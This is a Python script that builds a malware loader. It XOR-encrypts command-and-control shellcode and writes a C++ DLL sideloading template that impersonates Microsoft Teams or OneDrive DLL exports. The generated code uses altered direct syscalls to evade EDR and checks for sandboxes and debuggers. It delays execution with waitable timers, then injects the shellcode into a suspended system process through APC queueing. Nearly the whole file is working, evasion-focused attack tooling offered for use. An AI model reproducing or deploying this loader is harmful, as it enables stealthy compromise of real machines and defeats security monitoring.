#!/usr/bin/python3

"""
This script encrypts the raw shellcode of any C2 using XOR encryption and outputs a C code template
for DLL sideloading with the encrypted shellcode and a randomly generated 4-byte key.
Also we will use Dynamic Syscalls from syswispers 2 the assembly is modified to evade the pattern that the EDR search 
Random nop sleds are added and also registers are moved.
APC injection is also used to inject the shellcode in another process
Also Sandobox Evasion mechanisms are used Harddisk check & if the process is being debugged.
Finally Timing attack is placed in the loader which using waitable timers to delay the execution of the shellcode. 
Test fails if any of the calls return an error state.
"""

import sys
import random
import os


print(r"""
  ______  __    __   __  .___  ___.  _______ .______          ___      
 /      ||  |  |  | |  | |   \/   | |   ____||   _  \        /   \     
|  ,----'|  |__|  | |  | |  \  /  | |  |__   |  |_)  |      /  ^  \    
|  |     |   __   | |  | |  |\/|  | |   __|  |      /      /  /_\  \   
|  `----.|  |  |  | |  | |  |  |  | |  |____ |  |\  \----./  _____  \  
 \______||__|  |__| |__| |__|  |__| |_______|| _| `._____/__/     \__\ 
                                                                       
""")


#DLL_EXPORTS FOLDER PATH
folder_path="./DLL_EXPORTS/"

teams= "ms_teams_exports_usernev_dll.txt"
onedrive="onedrive_exports_version_dll.txt"

file_options = {"teams": teams, "onedrive": onedrive}

# generate random  4 byte key
key = ''.join([chr(random.randint(0, 255)) for i in range(4)])
key_hex = ''.join(['\\x' + hex(ord(x))[2:].zfill(2) for x in key])

#xor oeperation function 
def DoXor(data, key):
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        output_str += chr((current) ^ ord(current_key))

        
    return output_str


# Define the usage message so that the user will now how the script works
# Documentation
def print_usage():
    print(f"Usage: {sys.argv[0]} [raw payload file] [output path] [process name] [dll_exports]\n")
    print("  [raw payload file] : Path to file containing shellcode")
    print("  [output path]      : Path to output the C template file")
    print("  [process name]     : Name of process to inject shellcode into")
    print("  [dll_exports] : Specify which DLL Exports you want to use either teams or onedrive")
    print("  [replace shellcode variable name]   : [Optional] Replace shellcode variable name with a unique name")
    print("  [replace xor encryption  name]   : [Optional] Replace xor encryption name with a unique name")
    print("  [replace key variable name]   : [Optional] Replace key variable name with a unique name")
    print("  [replace sleep time via waitable timers]   : [Optional] Replace sleep time your own sleep time")



# read the shellcode from the file and then encrypt it
# Also output folder will be specified & the name of the process which will be injected

try:
    plaintext = open(sys.argv[1], "rb").read()
    output_folder = sys.argv[2]
    process_to_inject=sys.argv[3]
    file_alias = sys.argv[4]
    if file_alias not in file_options:
        print(f"Invalid file option. Available options: {', '.join(file_options.keys())}\n")
        sys.exit(1)
    file_option = file_options[file_alias]
    shellcode_var = sys.argv[5] if len(sys.argv) > 5 else "encoded_kwdikas"
    xor_func = sys.argv[6] if len(sys.argv) > 6 else "do_xor"
    key_var = sys.argv[7] if len(sys.argv) > 7 else "key"
    time = sys.argv[8] if len(sys.argv) > 8 else "4000"
except:
    print_usage()
    sys.exit()

#
with open(os.path.join(folder_path, file_option), "r") as f:
    # Read the contents of the file
    file_contents = f.read()


ciphertext = DoXor(plaintext, key)

# Split the ciphertext into chunks of 50 hex values
chunks = [ciphertext[i:i+50] for i in range(0, len(ciphertext), 50)]

# Convert each chunk to a string of comma-separated hex values
chunk_strings = [', '.join(['0x' + hex(ord(x))[2:].zfill(2) for x in chunk]) for chunk in chunks]

# Combine the chunk strings and format them into a shellcode string
ciphertext_split = '{\n\t' + ',\n\t'.join(chunk_strings) + '\n};'




# here we specify the DLL skeleton 
c_template = f"""
#include <stdio.h>
#include <stdlib.h>
#include "syscalls.h"

#define _CRT_SECURE_NO_DEPRECATE

#pragma warning (disable : 4996)


//Here we specify the DLL exports of whatever dll we want to use in this case userenv.dll
//We must use sharpdllproxy to auto make us a C file which will include all this exports.
//In the Assembly code we used some nop instructions with the help of some registers which will change the pattern of how syswhispers calls the syscalls

//here DLL exports are specified based an the user choice either MS Teams || OneDrive

{file_contents}


BOOL executed = FALSE;

//xor decryption
void {xor_func}(unsigned char* data, size_t data_len, char* key, size_t key_len)
{{
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++)
    {{
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }}
}};

/*
Timing attack using waitable timers. Test fails if any of the calls return an error state.
*/
BOOL timing_CreateWaitableTimer(UINT delayInMillis)
{{
    HANDLE hTimer;
    LARGE_INTEGER dueTime;

    BOOL bResult = FALSE;

    dueTime.QuadPart = delayInMillis * -10000LL;

    hTimer = CreateWaitableTimer(NULL, TRUE, NULL);

    if (hTimer == NULL)
    {{
        return TRUE;
    }}

    if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
    {{
        bResult = TRUE;
    }}
    else {{
        if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
        {{
            bResult = TRUE;
        }}
    }}

    CancelWaitableTimer(hTimer);
    CloseHandle(hTimer);
    return bResult;
}}
//sandbox check to check hardrive 
int gensandbox_drive_size() {{
    GET_LENGTH_INFORMATION size;
    DWORD lpBytesReturned;

    HANDLE drive = CreateFile(L"\\\\\\\.\\\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) {{
        // Someone is playing tricks. Or not {shellcode_var} enough privileges.
        CloseHandle(drive);
        return FALSE;
    }}
    BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
    CloseHandle(drive);

    if (result != 0) {{
        if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
            return TRUE;
    }}

    return FALSE;
}}


DWORD WINAPI DoMagic(LPVOID lpParameter)
{{

    unsigned char {shellcode_var}[] = {ciphertext_split}

    if (!executed)
    {{

        executed = TRUE;

        LPVOID allocation_start;
        SIZE_T allocation_size = sizeof({shellcode_var});
        NTSTATUS status = NULL;

        allocation_start = nullptr;

        char {key_var}[] = "{key_hex}";

        STARTUPINFOA si = {{ 0 }};
        PROCESS_INFORMATION pi = {{ 0 }};

        CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        HANDLE victimProcess = pi.hProcess;
        HANDLE threadHandle = pi.hThread;
        //delay execution
        timing_CreateWaitableTimer({time});

                    /*++

            Routine Description:

                CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
                it can be used to check if a remote process is being debugged. However,
                we can also use this as another method for checking if our own process
                is being debugged. This API internally calls the NTDLL export
                NtQueryInformationProcess function with the PROCESSINFOCLASS set to
                7 (ProcessDebugPort).

            Arguments:
                None
            Return Value:

                TRUE - if debugger was detected
                FALSE - otherwise
            --*/
        BOOL bIsDbgPresent = FALSE;
        DWORD oldProtect= NULL;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
        // Allocate Virtual Memory 
        NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        {xor_func}({shellcode_var}, sizeof({shellcode_var}), {key_var}, sizeof({key_var}));
        // Copy shellcode into allocated memory
        NtWriteVirtualMemory(victimProcess, allocation_start, {shellcode_var}, sizeof({shellcode_var}), 0);
        NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);

        NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
        NtResumeThread(threadHandle, NULL);
        return 0;
    }}
}}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{{
  LPVOID allocation_start;
    HANDLE hThread;
    allocation_start = nullptr;
    //HANDLE threadHandle;
    switch (ul_reason_for_call)
    {{
    case DLL_PROCESS_ATTACH:

        //sandbox check for harddisk size
        gensandbox_drive_size();

    
        hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(hThread);
        


    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        //sleep for 5 secs when  the process will be detached
        Sleep(5000);
        break;
    }}
    return TRUE;
}}



"""
# Create the output folder if it doesn't exist
if not os.path.exists(output_folder):
    os.makedirs(output_folder)

# Generate output file path
output_filename = os.path.join(output_folder, "main.cpp")

# Write encoded shellcode to output file
with open(output_filename, "w") as f:
    f.write(c_template)
print("Create a new visual studio project and copy the files located at " + output_folder + " Folder \n")
print("DLL SIDELOADING Template has been saved to: " + output_filename)



